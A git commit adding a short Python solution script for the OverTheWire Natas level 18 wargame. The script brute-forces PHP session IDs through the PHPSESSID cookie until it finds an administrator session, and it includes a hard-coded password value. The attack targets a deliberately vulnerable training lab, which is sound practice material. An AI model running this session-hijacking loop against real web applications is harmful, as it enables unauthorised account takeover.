f27f61fd013be9893f1ff03638e75a30f6b5efde
salehi_m <salehi_m@office.zharfpouyan.net>
2024-07-22 22:04:03 +0330

    Add natas18 solution script

---
+++ natas/natas18.py
@@ -0,0 +1,17 @@
+import requests
+password = "EqjHJbo7"
+
+a_pass = "natas_18_password"
+a_user = "natas18"
+maxid = 640
+
+for i in range(1,maxid):
+    print("trying {i} ...")
+    url = f"http://natas18.natas.labs.overthewire.org/index.php"
+    r = requests.get(url,auth=(a_user,a_pass),cookies={"PHPSESSID": f"{i}"})
+    if "You are logged in as a regular user. " not in r.text:
+        print(r.text)
+        break
+
+
+
